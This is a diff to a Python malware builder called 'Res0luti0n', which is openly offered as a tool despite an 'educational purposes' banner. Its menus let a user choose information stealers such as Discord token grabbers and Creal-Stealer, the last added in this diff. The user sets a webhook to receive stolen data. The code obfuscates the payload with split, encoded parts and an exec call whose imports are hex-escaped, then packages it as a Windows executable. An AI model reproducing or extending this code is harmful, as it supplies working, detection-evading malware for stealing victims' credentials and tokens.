@@ -1,4 +1,4 @@
-#<---       Res0luti0n builder by 0xSp00f3d         --->
+#<---       Res0luti0n builder by 0xSp00f3d      --->
 #<---             python 3.x                --->
 #<--- Only for educationnal / good purposes --->
 
@@ -12,7 +12,6 @@ import time
 import string
 import json
 from pypresence import Presence
-
 
 def rich_presence():
     try:
@@ -28,45 +27,33 @@ def rich_presence():
     except Exception as e:
         pass
 
-
 def readfile(path):
     with open(path, 'r', encoding='UTF-8') as f:
         data = f.read()
     return data
 
-
 def writefile(path, data):
     with open(path, 'w', encoding='UTF-8') as f:
         f.write(data)
-
 
 def read_json(file_path: str) -> dict:
     with open(file_path, 'r') as json_file:
         data = json.load(json_file)
     return data
 
-
 def write_json(file_path: str, data: dict) -> None:
     with open(file_path, 'w') as json_file:
-        json.dump(data, json_file)
-        
+        json.dump(data, json_file) 
         
 def update_json(param, value):
     json_data = read_json(f"{os.getcwd()}\\utilities\\config.json")
     json_data[f"{param}"] = str(value)
     write_json(f"{os.getcwd()}\\utilities\\config.json", json_data)
-     
-       
-def write_json(file_path: str, data: dict) -> None:
-    with open(file_path, 'w') as json_file:
-        json.dump(data, json_file)
-
 
 def get_settings():
     with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
         json_data = json.load(json_file)
     return json_data["name"], json_data["path"], json_data["requirements"], json_data["webhook"], json_data["exe_yn"], json_data["exe_comp"], json_data["icon"]
-
 
 def webhook_checker(webhook_link):
     try:
@@ -77,13 +64,11 @@ def webhook_checker(webhook_link):
             return "Valid"
     except Exception as e: 
         return "Invalid"
-   
     
-def base85_encoder(data):
+def base64_encoder(data):
     bytes_text = data.encode('UTF-8')
     b85_text = base64.b64encode(bytes_text)
     return b85_text.decode('UTF-8')
-
 
 def script_hasher(script):
     nb_parties = random.randint(5, 10)
@@ -91,7 +76,6 @@ def script_hasher(script):
     parties = [script[i * longueur_partie:(i + 1) * longueur_partie] for i in range(nb_parties - 1)]
     parties.append(script[(nb_parties - 1) * longueur_partie:])
     return parties
-
 
 def part_encoder(part, alpha):
     key = ''.join(random.sample(alpha, 2))
@@ -106,8 +90,7 @@ def part_encoder(part, alpha):
         else:
             c_int = c
         text_int += c_int
-    return base85_encoder(text_int + key)
-
+    return base64_encoder(text_int + key)
 
 def obfuscate(content):
     ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
@@ -128,14 +111,14 @@ def obfuscate(content):
     code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VARIABLE_NAME}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
     return code
 
-
 def choice_rat(banner, w, m):
     while True:
         os.system("cls")
         print(f"{banner}\n -----\n")
         print(f" {m}[{w}+{m}]{w} Malware choice:\n")
-        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}3{m}]{w} Select your own py malware")
-        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}4{m}]{w} Back to home")
+        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}4{m}]{w} Select your own py malware")
+        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}5{m}]{w} Back to home")
+        print(f" {m}[{w}3{m}]{w} Creal-Stealer (by Ayhuuu)               |")
         choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
         
         if choice_rat == "1":
@@ -156,6 +139,14 @@ def choice_rat(banner, w, m):
         
         elif choice_rat == "3":
             os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "Creal.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Creal-Stealer by Ayhuuu !")
+            time.sleep(3)
+        
+        elif choice_rat == "4":
+            os.system("cls")
             input(f"{banner}\n\n {m}[{w}!{m}]{w} Warning: If you select your own malware you must enter your webhook manually !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
             os.system("cls")
             path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your malware path here: ")
@@ -166,7 +157,7 @@ def choice_rat(banner, w, m):
             print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: {os.path.basename(path)} !")
             time.sleep(3)
         
-        elif choice_rat == "4":
+        elif choice_rat == "5":
             settings_menu(banner, w, m)
 
 def exe_settings(banner, w, m):
@@ -222,7 +213,6 @@ def exe_settings(banner, w, m):
         elif choice_exe == "4":
             settings_menu(banner, w, m)
 
-    
 def settings_menu(banner, w, m):
     while True:
         os.system("cls")
@@ -260,8 +250,7 @@ def settings_menu(banner, w, m):
         elif choice_settings == "5": 
             os.system("cls")
             main()
-            
-            
+                        
 def builder(banner, m, w):
     name, path_, requirements, webhook, exe_yn, exe_comp, icon = get_settings()
     
@@ -292,6 +281,7 @@ def builder(banner, m, w):
 
         injector_with_all = readfile(os.path.join(os.getcwd(), 'utilities', 'injector.py')).replace("'RECOMPYLER'", recompyler)
         injector_with_all = injector_with_all.replace("'SRC_HASHED'", str(src_hashed))
+        injector_with_all = injector_with_all.replace("'PIPREQUIREMENTS'", str(readfile(requirements)))
 
         if os.path.exists(name):
             shutil.rmtree(name, ignore_errors=True)
@@ -299,15 +289,14 @@ def builder(banner, m, w):
         else: os.makedirs(name)
         
         writefile(f'{name}\\{name}.py', obfuscate(injector_with_all))
-        shutil.copy(requirements, os.path.join(os.getcwd(), name, "requirements.txt"))
-        
+
         if exe_yn == "y":
             script_name = os.path.join(os.getcwd(), name, f"{name}.py")
             target_dir = f"{name}-exe"
-            icon_option = f"--icon {icon}" if icon != "None" else ""
+            icon_option = f"--icon={icon}" if icon != "None" else ""
             
             if exe_comp == "Cx_freeze":
-                cmd = f"cxfreeze -c {script_name} --target-dir {name}-exe {icon_option} --packages=win32api "
+                cmd = f"cxfreeze -c {script_name} --target-dir {name}-exe {icon_option} --packages=win32api --packages=win32con"
             elif exe_comp == "Pyinstaller":
                 cmd = f"pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con {script_name}"
             os.system("cls")
@@ -318,7 +307,6 @@ def builder(banner, m, w):
                 try: os.remove(name + '.spec')
                 except: pass
             
-            shutil.copy(requirements, os.path.join(os.getcwd(), f"{name}-exe", "requirements.txt"))
             shutil.make_archive(f"{name}-exe", 'zip', name + "-exe")
             shutil.rmtree(f"{name}-exe", ignore_errors=True)
             
@@ -334,7 +322,6 @@ def builder(banner, m, w):
         os.system("cls")
         input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the malware!")
         
-
 def main():
     m = colorama.Fore.LIGHTMAGENTA_EX
     w = colorama.Fore.LIGHTWHITE_EX
